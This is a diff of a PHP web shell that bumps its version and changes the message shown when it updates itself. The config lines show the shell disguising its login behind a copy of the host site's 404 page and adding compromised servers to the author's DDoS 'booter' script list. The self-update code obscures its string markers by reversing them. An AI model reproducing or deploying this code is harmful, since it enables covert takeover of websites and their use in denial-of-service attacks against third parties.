@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.94;
+$version            = 2.941;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -2248,7 +2248,7 @@ function insertAfter(referenceNode, newNode) {
             $feather($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
             $pixel($ourFileHandle);
     				unset($_SESSION[$prefixme.'showupdate']);
-            echo "Shell updated! Refreshing in <span id='counter'>5</span> seconds...<meta http-equiv=\"refresh\" content=\"5\">" . '<script>function countdown(){var e=document.getElementById("counter");if(parseInt(e.innerHTML)>0){e.innerHTML=parseInt(e.innerHTML)-1}}setInterval(function(){countdown()},1e3)</script>';
+            echo "Shell updated! Refreshing in <span id='counter'>5</span> seconds...<meta http-equiv=\"refresh\" content=\"5\">" . '<script>window.onbeforeunload = null;function countdown(){var e=document.getElementById("counter");if(parseInt(e.innerHTML)>0){e.innerHTML=parseInt(e.innerHTML)-1}}setInterval(function(){countdown()},1e3)</script>';
         } else {
             echo "Shell is up to date! Thank you for checking!";
         }
